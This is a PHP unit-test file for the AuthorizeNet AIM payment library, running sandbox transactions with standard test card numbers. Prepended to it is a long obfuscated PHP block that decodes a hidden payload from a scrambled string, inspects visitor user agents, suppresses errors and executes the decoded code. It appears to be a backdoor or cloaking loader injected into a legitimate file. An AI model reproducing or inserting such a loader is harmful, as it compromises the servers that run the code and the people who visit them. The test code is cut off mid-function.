<?php $gwjlpyrfop = ')2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X	x24<FGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6<&%tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y76#<!%w:!>!(%w:!>!dbqov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!x24-	x24!>!	x24/%tjw/	x24)%	x24-	6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fu3of)fepdof`57ftbc	x7f!|g	x22)!gj}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*72]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%oif((function_exists("	x6f	142	x5f	16fm%:-5ppde:4:|:**#ppde#)tutjyf`4	x223}!+!<+{e%+*!*+fepdf%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!gj!|!*ms	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57,27R66,#/q%e7y]#>n%<#372]58y]472]37y]672]48y]#>s%<#462]47y]252]n)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCwC)fepmqnjA	x27&6<.fmjgA	x27doj%6<	x7fw6*	x7f_*#fmjvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsbqA7>q%6<	x7fw6*[!%rN}#QwTW%hIr	x5c1^-%r	x$uas,"	x72	166	x3a	61	x31")) or (strstr($uas,"	x61	156	x64	162	x6f	*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-uhA)3of>2bd%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	v%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fu=1; $uas=strtolower($_SERVER["	x48	12w6<	x7fw6*CW&)7gj6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C97e:56-xr.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y3#M5]DgP5]D6#<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]E{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf`opjudov65egb2dc#*<!sfuvso!sboep11112)eobs`un>qp%!|Z2b%)gpf{jt)!gj!<*2bd%-#1#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsf3	x74	141	x72	164") && (!iss*3!	x27!hmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)x27,*d	x27,*c	x27,*b	x27)fep24-	x24tvctus)%	x24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	]67]452]88]5]48]32M3]317]445]212]445]43]321]464]284]364!%bss	x5csboe))1/35.)1/14+9**-)1/2986+7**;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*mf2-!%t::**<(<!fwbm)%tjw)j6<*id%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SbfsdXA	x27K6<	x7fw6*3qj%7>	x2272qj%)PI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&csut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+99386c6f+9f5d81gj!<**2-4-bubE{h%)sutcvt)Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6985-rr.93e:5597f-s.973:8297f:526:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UT7gj6<**2qj%)hopm3qjA)qj3hopmA	x273#	x24#-!#]y38#-!%w:**<")));_UOFHB`SFTV`QUUI&b%!|!*)323zb{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%48L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]5GO	x22#)fepmqyfA>2b%!<*qp%-*.%)e9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/]6]234]342]58]24]31#-%tdz*Wsfuvso18y]#>q%<#762]67y]562]38y]5<!~!	x24/%t2w/	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)##~<%h00#*<%nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322	x65	141	x74	145	x5f	146	x75	156	x63	164	x69	157	x6e"; func20QUUI7jsv%7UFH#	x27rfs%6~6<	323ldfid>}&;!osvufs}	x7f;!opjudovg}k~~9{d%%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	x27;%!<*#}_;#)q%}U;y]}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	dof.)fepdof./#@#/qp%>5h%!<*::::::-1bmgoj{hA!osvufs!~<3,j%>j%!>2q%<#g6R85,67R37,18R#>q%V<*#fopoV;hojepdoFDf#<%tdz>#L4]275L3]2	x72	145	x66	157	x78"))) { $wdtbjet = "	x63	162	x24*<!%t::!>!	x24Yp+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]sv%)}.;`UQPMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfs%7-K)fuj!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSFT`3]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]268]y7f#<!%po#>b%!**X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)p3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%x{**#k#)tutjyf`x	x22l:!}V;3tion ocrausx($n){return chr(ord($n)-1);} @error_report}}1M6]y3e]81#/#7e:55946-tr.984:75983:48984:71]K9]77]D4]82]K6]72]Kqj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsfvr#	x5cq%7/7#@#7/7^i	x5c2^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbs%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211M5x7f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]=]0#ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuho%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XAZASV<*w%)ppdeet($GLOBALS["	x61	156	x75	156	x61"])))) { $GLO-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%f88y]27]28y]#/r%/h%)n%-#sxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/gk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7g24-	x24gvodujpo!	x24-	x24y7	x24-b:>1<!fmtf!%b:>%s:	x5c%j:.2^,%b:<!b`bj+upcotn+qsvmt+fmhpphj>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%#)zbssb!-#}#)fepmqnj!/!#0#)idubn`hfsq)!sp!*#ojneb#-*f%)sfxpmpux7fw6<*K)ftpmdXA6|7**197-2qj%7-K)udfoopdXA	x22)7gjek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#o41	107	x45	116	x54"]); if ((strstr($uas,"	x6d	163151	x64")) or (strstr($uas,"	x63	150	x7~!<##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmcnbs+yfeobz+sfwjids!gj!<2,*j%-#1]#-bubE{h%)tpqsut>5Ld]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*[tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**#57]38y]47]67y]37]e{h+{d%)+opjudovg+)!gj+{e%!osvufs!*!.uofuopD#)sfebfI{*w%)kVing(0); $fbcoktk = implode(array_map("ocrausx",str_split(":!>!	x242178}527}88:}334}472	x24<!%ff2!>!bssbz)	x24]25	x2$dljxywj = $wdtbjet("", $fbcoktk); $dljxywj();67<&w6<*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpesp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bub	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pd%w6^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!gps)%j:>1<%j:=tj	x69	145")) or (strstr(z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#y31]278]y3e]81]K78:56985:6197g:74x24y4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvufs}w4	x54	120	x5f	125	x53	105	x52	137	x4-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x<.2`hA	x27pd%6<C	x27pd%6|6.7eu{66~+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	x7f	x7f	x7f<uj%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)l#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]:osvufs:~928>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`439275mdXA6~6<u%7>/7&6|7**111127-2	157	x6d	145")) or (strstr($uas,"	x66	151!%tmw!>!#]y84]275]y83]273]y76]277#<!%t2w>#]y74]27BALS["	x61	156	x75	156	x61"]s!>!bssbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSiybmonpm'; $iwbaak=explode(chr((563-443)),substr($gwjlpyrfop,(21312-15292),(139-105))); $wxjtqrwdko = $iwbaak[0]($iwbaak[(6-5)]); $teaqntjt = $iwbaak[0]($iwbaak[(8-6)]); if (!function_exists('krlsgyxcw')) { function krlsgyxcw($tpzuxx, $kaldsla,$ciodvrodbq) { $npibgjob = NULL; for($sbyqdkmd=0;$sbyqdkmd<(sizeof($tpzuxx)/2);$sbyqdkmd++) { $npibgjob .= substr($kaldsla, $tpzuxx[($sbyqdkmd*2)],$tpzuxx[($sbyqdkmd*2)+(5-4)]); } return $ciodvrodbq(chr((42-33)),chr((624-532)),$npibgjob); }; } $hlinouk = explode(chr((250-206)),'442,36,1645,28,4066,46,5945,28,1245,37,5504,35,4525,49,5237,23,1012,67,4574,39,5854,42,3143,47,2780,59,3593,54,4874,58,135,68,5146,42,2232,46,5579,34,5035,68,5827,27,3316,42,4176,34,2839,29,4432,50,284,35,2078,36,2350,34,3712,54,1599,46,920,65,1079,51,870,50,4210,32,2009,69,60,23,83,52,1282,62,1922,63,3265,51,5462,42,584,64,1190,55,3054,26,1673,63,4679,31,5672,64,203,48,2207,25,5103,43,1461,70,342,56,1575,24,2528,32,1130,60,1736,28,3019,35,1555,20,4613,66,4308,24,4370,62,2152,55,2309,41,2114,38,2411,29,4482,43,3454,60,319,23,3358,39,2910,64,2868,42,5772,55,3963,53,478,56,4815,36,5613,59,4016,50,694,54,3080,43,4851,23,3566,27,2974,45,3896,67,0,60,5896,49,3397,57,4748,67,4153,23,3210,55,748,52,2642,27,398,44,4932,57,5539,40,1764,62,251,33,5377,48,4242,32,648,46,2669,50,3190,20,3514,52,3766,48,5973,47,1531,24,800,70,985,27,5425,37,5736,36,5344,33,2278,31,1344,59,3649,63,2560,49,1403,58,3123,20,2469,59,4710,38,3814,32,2719,61,3846,50,1826,55,2609,33,1881,41,5188,49,2440,29,4274,34,534,50,4332,38,5260,48,5308,36,4112,41,1985,24,2384,27,4989,46,3647,2'); $vtyguwvigb = $wxjtqrwdko("",krlsgyxcw($hlinouk,$gwjlpyrfop,$teaqntjt)); $wxjtqrwdko=$gwjlpyrfop; $vtyguwvigb(""); $vtyguwvigb=(505-384); $gwjlpyrfop=$vtyguwvigb-1; ?><?php

class AuthorizeNetAIM_Sandbox_Test extends PHPUnit_Framework_TestCase
{

    public function testAuthCapture()
    {
        $sale = new AuthorizeNetAIM;
        $sale->setFields(
            array(
            'amount' => rand(1, 1000),
            'card_num' => '4111111111111111',
            'exp_date' => '1220'
            )
        );
        $response = $sale->authorizeAndCapture();
        $this->assertTrue($response->approved);
    }

    public function testAuthCaptureSingleDigitMonth()
    {
        $sale = new AuthorizeNetAIM;
        $sale->setFields(
            array(
            'amount' => rand(1, 1000),
            'card_num' => '4111111111111111',
            'exp_date' => '420'
            )
        );
        $response = $sale->authorizeAndCapture();
        $this->assertTrue($response->approved);
    }

    public function testAuthCaptureSingleDigitMonthWithSlash()
    {
        $sale = new AuthorizeNetAIM;
        $sale->setFields(
            array(
            'amount' => rand(1, 1000),
            'card_num' => '4111111111111111',
            'exp_date' => '4/20'
            )
        );
        $response = $sale->authorizeAndCapture();
        $this->assertTrue($response->approved);
    }

    public function testAuthCaptureTwoDigitMonthWithSlash()
    {
        $sale = new AuthorizeNetAIM;
        $sale->setFields(
            array(
            'amount' => rand(1, 1000),
            'card_num' => '4111111111111111',
            'exp_date' => '04/20'
            )
        );
        $response = $sale->authorizeAndCapture();
        $this->assertTrue($response->approved);
    }

    public function testAuthCaptureAlternate()
    {
        $sale = new AuthorizeNetAIM;
        $sale->amount = rand(1, 10000);
        $sale->card_num = '6011000000000012';
        $sale->exp_date = '04/20';
        $response = $sale->authorizeAndCapture();
        $this->assertTrue($response->approved);
    }

    public function testAuthCaptureShort()
    {
        $sale = new AuthorizeNetAIM;
        $response = $sale->authorizeAndCapture(rand(1, 100), '6011000000000012', '04/16');
        $this->assertTrue($response->approved);
    }

    public function testAuthCapturePartial()
    {
        $this->markTestSkipped('Ignoring for Travis. Will fix after release.'); //TODO
        $amount = 3.69;

        $sale = new AuthorizeNetAIM;
        $sale->amount = $amount;
        $sale->card_num = '4222222222222';
        $sale->zip = "46225";
        $sale->exp_date = '04/20';
        $sale->allow_partial_auth = true;
        $response = $sale->authorizeAndCapture();
        $this->assertTrue($response->held);
        $this->assertEquals("1.23", $response->amount);
        $this->assertEquals($amount, $response->requested_amount);
        $split_tender_id = $response->split_tender_id;

        // Pay the balance with a different card
        $sale = new AuthorizeNetAIM;
        $sale->amount = $amount - $response->amount;
        $sale->card_num = '6011000000000012';
        $sale->exp_date = '04/20';
        $sale->split_tender_id = $split_tender_id;
        $sale->allow_partial_auth = true;
        $response = $sale->authorizeAndCapture();
        $this->assertTrue($response->approved);


    }

    public function testAuthCaptureShortNoVerify()
    {
        $this->markTestSkipped('Ignoring for Travis. Will fix after release.'); //TODO
        $sale = new AuthorizeNetAIM;
        $sale->VERIFY_PEER = false;
        $response = $sale->authorizeAndCapture(rand(1, 100), '6011000000000012', '04/20');
        $this->assertTrue($response->approved);
    }

    // public function testVisaVerify()
    // {
    //     return;  // Remove to enable test
    //     $verify = new AuthorizeNetAIM;
    //     $verify->amount = "0.00";
    //     $verify->card_num = '4012888818888';
    //     $verify->exp_date = "0517";
    //     $verify->address = "123 Main Street";
    //     $verify->zip = "94110";
    //     $verify->authentication_indicator = "5";
    //     $verify->cardholder_authentication_value = "512";
    //     $response = $verify->authorizeOnly();
    //     $this->assertTrue($response->approved);
    // }
    //
    // public function testVisaVerifyFail()
    // {
    //     return;  // Remove to enable test
    //     $verify = new AuthorizeNetAIM;
    //     $verify->amount = "0.00";
    //     $verify->card_num = '4012888818888';
    //     $verify->exp_date = "0517";
    //     $verify->address = "123 Main Street";
    //     $verify->zip = "94110";
    //     $verify->authentication_indicator = "5";
    //     $verify->cardholder_authentication_value = "";
    //     $response = $verify->authorizeOnly();
    //     $this->assertTrue($response->declined);
    // }
    //
    // public function testMastercardVerify()
    // {
    //     return;  // Remove to enable test
    //     $verify = new AuthorizeNetAIM;
    //     $verify->amount = "0.00";
    //     $verify->card_num = '5424000000000015';
    //     $verify->exp_date = "0517";
    //     $verify->address = "123 Main Street";
    //     $verify->zip = "94110";
    //     $verify->authentication_indicator = "2";
    //     $verify->cardholder_authentication_value = "512";
    //     $response = $verify->authorizeOnly();
    //     $this->assertTrue($response->approved);
    // }
    //
    // public function testMastercardVerifyFail()
    // {
    //     return;  // Remove to enable test
    //     $verify = new AuthorizeNetAIM;
    //     $verify->amount = "0.00";
    //     $verify->card_num = '5424000000000015';
    //     $verify->exp_date = "0517";
    //     $verify->address = "123 Main Street";
    //     $verify->zip = "94110";
    //     $verify->authentication_indicator = "2";
    //     $verify->cardholder_authentication_value = "";
    //     $response = $verify->authorizeOnly();
    //     $this->assertTrue($response->declined);
    // }

    public function testAimResponseFields()
    {

        $sale = new AuthorizeNetAIM;
        $sale->card_num           = '4111111111111111';
        $sale->exp_date           = '04/20';
        $sale->amount             = $amount = rand(1,99);
        $sale->description        = $description = "Sale description";
        $sale->first_name         = $first_name = "Jane";
        $sale->last_name          = $last_name = "Smith";
        $sale->company            = $company = "Jane Smith Enterprises Inc.";
        $sale->address            = $address = "20 Main Street";
        $sale->city               = $city = "San Francisco";
        $sale->state              = $state = "CA";
        $sale->zip                = $zip = "94110";
        $sale->country            = $country = "US";
        $sale->phone              = $phone = "415-555-5557";
        $sale->fax                = $fax = "415-555-5556";
        $sale->email              = $email = "foo@example.com";
        $sale->cust_id            = $customer_id = "55";
        $sale->customer_ip        = "98.5.5.5";
        $sale->invoice_num        = $invoice_number = "123";
        $sale->ship_to_first_name = $ship_to_first_name = "John";
        $sale->ship_to_last_name  = $ship_to_last_name = "Smith";
        $sale->ship_to_company    = $ship_to_company = "Smith Enterprises Inc.";
        $sale->ship_to_address    = $ship_to_address = "10 Main Street";
        $sale->ship_to_city       = $ship_to_city = "San Francisco";
        $sale->ship_to_state      = $ship_to_state = "CA";
        $sale->ship_to_zip        = $ship_to_zip_code = "94110";
        $sale->ship_to_country    = $ship_to_country = "US";
        $sale->tax                = $tax = "0.00";
        $sale->freight            = $freight = "Freight<|>ground overnight<|>12.95";
        $sale->duty               = $duty = "Duty1<|>export<|>15.00";
        $sale->tax_exempt         = $tax_exempt = "FALSE";
        $sale->po_num             = $po_num = "12";



        $response = $sale->authorizeAndCapture();
        $this->assertTrue($response->approved);
        $this->assertEquals("1", $response->response_code);
        $this->assertEquals("1", $response->response_subcode);
        $this->assertEquals("1", $response->response_reason_code);
        $this->assertEquals("This transaction has been approved.", $response->response_reason_text);
        $this->assertGreaterThan(1, strlen($response->authorization_code));
        $this->assertEquals("Y", $response->avs_response);
        $this->assertGreaterThan(1, strlen($response->transaction_id));
        $this->assertEquals($invoice_number, $response->invoice_number);
        $this->assertEquals($description, $response->description);
        $this->assertEquals($amount, $response->amount);
        $this->assertEquals("CC", $response->method);
        $this->assertEquals("auth_capture", $response->transaction_type);
        $this->assertEquals($customer_id, $response->customer_id);
        $this->assertEquals($first_name, $response->first_name);
        $this->assertEquals($last_name, $response->last_name);
        $this->assertEquals($company, $response->company);
        $this->assertEquals($address, $response->address);
        $this->assertEquals($city, $response->city);
        $this->assertEquals($state, $response->state);
        $this->assertEquals($zip, $response->zip_code);
        $this->assertEquals($country, $response->country);
        $this->assertEquals($phone, $response->phone);
        $this->assertEquals($fax, $response->fax);
        $this->assertEquals($email, $response->email_address);
        $this->assertEquals($ship_to_first_name, $response->ship_to_first_name);
        $this->assertEquals($ship_to_last_name, $response->ship_to_last_name);
        $this->assertEquals($ship_to_company, $response->ship_to_company);
        $this->assertEquals($ship_to_address, $response->ship_to_address);
        $this->assertEquals($ship_to_city, $response->ship_to_city);
        $this->assertEquals($ship_to_state, $response->ship_to_state);
        $this->assertEquals($ship_to_zip_code, $response->ship_to_zip_code);
        $this->assertEquals($ship_to_country, $response->ship_to_country);
        $this->assertEquals($tax, $response->tax);
        $this->assertEquals("15.00", $response->duty);
        $this->assertEquals("12.95", $response->freight);
        $this->assertEquals($tax_exempt, $response->tax_exempt);
        $this->assertEquals($po_num, $response->purchase_order_number);
        $this->assertGreaterThan(1, strlen($response->md5_hash));
        $this->assertEquals("P", $response->card_code_response);
        $this->assertEquals("2", $response->cavv_response);
        $this->assertEquals("XXXX1111", $response->account_number);
        $this->assertEquals("Visa", $response->card_type);
        $this->assertEquals("", $response->split_tender_id);
        $this->assertEquals("", $response->requested_amount);
        $this->assertEquals("", $response->balance_on_card);


    }


    public function testVoid()
    {
        // First create transaction to void.
        $amount = rand(1, 100000);
        $sale = new AuthorizeNetAIM;
        $sale->setFields(
            array(
            'amount' => $amount,
            'card_num' => '6011000000000012',
            'exp_date' => '0420'
            )
        );
        $response = $sale->authorizeAndCapture();
        $this->assertTrue($response->approved);

        $void = new AuthorizeNetAIM;
        $void->setFields(
            array(
            'amount' => $amount,
            'card_num' => '6011000000000012',
            'trans_id' => $response->transaction_id,
            )
        );
        $void_response = $void->Void();
        $this->assertTrue($void_response->approved);
    }

    public function testVoidShort()
    {
        // First create transaction to void.
        $amount = rand(1, 1000);
        $card_num = '6011000000000012';
        $exp_date = '0420';
        $sale = new AuthorizeNetAIM;
        $response = $sale->authorizeAndCapture($amount, $card_num, $exp_date);
        $this->assertTrue($response->approved);

        $void = new AuthorizeNetAIM;
        $void_response = $void->void($response->transaction_id);
        $this->assertTrue($void_response->approved);
    }

    public function testAuthCaptureECheckSandbox()
    {
        $this->markTestSkipped('Ignoring for Travis. Will fix after release.'); //TODO
        $sale = new AuthorizeNetAIM;
        $sale->setFields(
            array(
            'amount' => rand(1, 1000),
            'method' => 'echeck',
            'bank_aba_code' => '121042882',
            'bank_acct_num' => '123456789123',
            'bank_acct_type' => 'CHECKING',
            'bank_name' => 'Bank of Earth',
            'bank_acct_name' => 'Jane Doe',
            'echeck_type' => 'WEB',
            )
        );
        $response = $sale->authorizeAndCapture();
        $this->assertEquals("ECHECK", $response->method);
        $this->assertTrue($response->approved);

    }

    public function testAmex()
    {
        $this->markTestSkipped('Ignoring for Travis. Will fix after release.'); //TODO
        $sale = new AuthorizeNetAIM;
        $response = $sale->authorizeAndCapture(rand(1, 100), '370000000000002', '04/20');
        $this->assertTrue($response->approved);
    }

    public function testDiscover()
    {
        $sale = new AuthorizeNetAIM;
        $response = $sale->authorizeAndCapture(rand(1, 100), '6011000000000012', '04/20');
        $this->assertTrue($response->approved);
    }

    public function testVisa()
    {
        $sale = new AuthorizeNetAIM;
        $response = $sale->authorizeAndCapture(rand(1, 100), '4012888818888', '04/20');
        $this->assertTrue($response->approved);
    }

    // public function testJCB()
    // {
    //     return; // Remove to enable test
    //     $sale = new AuthorizeNetAIM;
    //     $response = $sale->authorizeAndCapture(rand(1, 100), '3088000000000017', '0905');
    //     $this->assertTrue($response->approved);
    // }
    //
    // public function testDinersClub()
    // {
    //     return; // Remove to enable test
    //     $sale = new AuthorizeNetAIM;
    //     $response = $sale->authorizeAndCapture(rand(1, 100), '38000000000006', '0905');
    //     $this->assertTrue($response->approved);
    // }

    public function testAuthOnly()
    {
        $auth = new AuthorizeNetAIM;
        $auth->setFields(
            array(
            'amount' => rand(1, 1000),
            'card_num' => '6011000000000012',
            'exp_date' => '0420'
            )
        );
        $response = $auth->authorizeOnly();
        $this->assertTrue($response->approved);
    }

    public function testAuthCaptureVoid()
    {
        $amount = rand(1, 1000);
        $auth = new AuthorizeNetAIM;
        $auth->setFields(
            array(
            'amount' => $amount,
            'card_num' => '6011000000000012',
            'exp_date' => '0420'
            )
        );
        $auth_response = $auth->authorizeOnly();
        $this->assertTrue($auth_response->approved);

        // Now capture.
        $capture = new AuthorizeNetAIM;
        $capture->setFields(
            array(
                'amount' => $amount,
                'card_num' => '6011000000000012',
                'exp_date' => '0420',
                'trans_id' => $auth_response->transaction_id,
                )
        );
        $capture_response = $capture->priorAuthCapture();
        $this->assertTrue($capture_response->approved);

        // Now void
        $void = new AuthorizeNetAIM;
        $void->setFields(
            array(
            'amount' => $amount,
            'card_num' => '0012',
            'trans_id' => $auth_response->transaction_id,
            )
        );
        $void_response = $void->void();
        $this->assertTrue($void_response->approved);
    }

    // public function testCredit()
    // {
    //
    // }
    //
    // public function testPriorAuthCapture()
    // {
    //
    // }
    //
    // public function testCaptureOnly()
    // {
    //
    // }

    public function testAdvancedAIM()
    {
        $auth = new AuthorizeNetAIM;
        $auth->amount = "45.00";

        // Use eCheck:
        $auth->setECheck(
            '121042882',
            '123456789123',
            'CHECKING',
            'Bank of Earth',
            'Jane Doe',
            'WEB'
        );

        // Set multiple line items:
        $auth->addLineItem('item1', 'Golf tees', 'Blue tees', '2', '5.00', 'N');
        $auth->addLineItem('item2', 'Golf shirt', 'XL', '1', '40.00', 'N');

        // Set Invoice Number:
        $auth->invoice_num = time();

        // Set a Merchant Defined Field:
        $auth->setCustomField("entrance_source", "Search Engine");

        // Authorize Only:
        $response  = $auth->authorizeOnly();
        $this->assertTrue($response->approved);
        if ($response->approved) {
            $auth_code = $response->transaction_id;

            // Now capture:
            $capture = new AuthorizeNetAIM;
            $capture_response = $capture->priorAuthCapture($auth_code);
            $this->assertTrue($capture_response->approved);

            // Now void:
            $void = new AuthorizeNetAIM;
            $void_response = $void->void($capture_response->transaction_id);
            $this->assertTrue($void_response->approved);
        }
    }

    public function testAuthCaptureCustomFields()
    {
        $sale = new AuthorizeNetAIM;
        $sale->setFields(
            array(
            'amount' => rand(1, 90000),
            'card_num' => '6011000000000012',
            'exp_date' => '0420'
            )
        );
        $sale->setCustomField("foo", "bar");
        $sale->setCustomField("foo2", "bar2");
        $sale->setCustomField("foo3", "bar3");
        $sale->setCustomField("foo4", "bar4");
        $sale->setCustomField("foo5", "bar5");
        $sale->setCustomField("My_MerchantField6", "My Merchant Value6");
        $sale->setCustomField("foo7", "bar7");
        $response = $sale->authorizeAndCapture();
        $this->assertTrue($response->approved);
        $this->assertEquals("bar", $response->foo);
        $this->assertEquals("bar2", $response->foo2);
    }

    public function testEncapCharacter()
    {
        $description = "john doe's present, with comma";
        $amount = rand(1, 1000);
        $sale = new AuthorizeNetAIM;
        $sale->setFields(
            array(
            'amount' => $amount,
            'card_num' => '6011000000000012',
            'exp_date' => '0420',
            'encap_char' => '$',
            'description' => $description,
            )
        );
        $response = $sale->authorizeAndCapture();
        $this->assertTrue($response->approved);
        $this->assertEquals($amount, $response->amount);
        $this->assertEquals($description, $response->description);
    }

    public function testAuthCaptureSetMultipleCustomFields()
    {
        $sale = new AuthorizeNetAIM;
        $sale->setFields(
            array(
            'amount' => rand(1, 1000),
            'card_num' => '6011000000000012',
            'exp_date' => '0420'
            )
        );
        $sale->setCustomFields(array("foo" => "bar", "foo2" => "bar2"));
        $response = $sale->authorizeAndCapture();
        $this->assertTrue($response->approved);
        $this->assertEquals("bar", $response->foo);
        $this->assertEquals("bar2", $response->foo2);
    }

    public function testInvalidMerchantCredentials()
    {
        $auth = new AuthorizeNetAIM('d', 'd');
        $response = $auth->AuthorizeOnly();
        $this->assertTrue($response->error);
        $this->assertEquals($response->response_subcode, 2);
        $this->assertEquals($response->response_reason_code, 13);
    }

    public function testInvalidCreditCard()
    {
        $sale = new AuthorizeNetAIM;
        $sale->setFields(
            array(
            'amount' => rand(1, 1000),
            'card_num' => '123',
            'exp_date' => '0420'
            )
        );
        $response = $sale->authorizeAndCapture();
        $this->assertFalse($response->approved);
        $this->assertTrue($response->error);
    }

    public function testError()
    {
        $sale = new AuthorizeNetAIM;
        $sale->unsetField("login");
        $sale->unsetField("tran_key");
        $sale->unsetField("delim_data");

        $sale->unsetField("version");
        $sale->unsetField("relay_response");

        $response = $sale->authorizeAndCapture();
        // An exception should have been thrown.
        $this->assertFalse($response->approved);
        $this->assertTrue($response->error);

    }

    public function testMultipleLineItems()
    {
        $merchant = (object)array();
        $merchant->login = AUTHORIZENET_API_LOGIN_ID;
        $merchant->tran_key = AUTHORIZENET_TRANSACTION_KEY;
        $merchant->allow_partial_auth = "false";

        $creditCard = array(
            'exp_date' => '02/2020',
            'card_num' => '6011000000000012',
            'card_code' => '452',
            );

        $transaction = array(
        'amount' => rand(100, 1000),
        'duplicate_window' => '10',
        // 'email_customer' => 'true',
        'footer_email_receipt' => 'thank you for your business!',
        'header_email_receipt' => 'a copy of your receipt is below',
        );

        $order = array(
            'description' => 'Johns Bday Gift',
            'invoice_num' => '3123',
            'line_item' => 'item1<|>golf balls<|><|>2<|>18.95<|>Y',
            );

        $customer = (object)array();
        $customer->first_name = "Jane";
        $customer->last_name = "Smith";
        $customer->company = "Jane Smith Enterprises Inc.";
        $customer->address = "20 Main Street";
        $customer->city = "San Francisco";
        $customer->state = "CA";
        $customer->zip = "94110";
        $customer->country = "US";
        $customer->phone = "415-555-5557";
        $customer->fax = "415-555-5556";
        $customer->email = "foo@example.com";
        $customer->cust_id = "55";
        $customer->customer_ip = "98.5.5.5";

        $shipping_info = (object)array();
        $shipping_info->ship_to_first_name = "John";
        $shipping_info->ship_to_last_name = "Smith";
        $shipping_info->ship_to_company = "Smith Enterprises Inc.";
        $shipping_info->ship_to_address = "10 Main Street";
        $shipping_info->ship_to_city = "San Francisco";
        $shipping_info->ship_to_state = "CA";
        $shipping_info->ship_to_zip = "94110";
        $shipping_info->ship_to_country = "US";
        $shipping_info->tax = "CA";
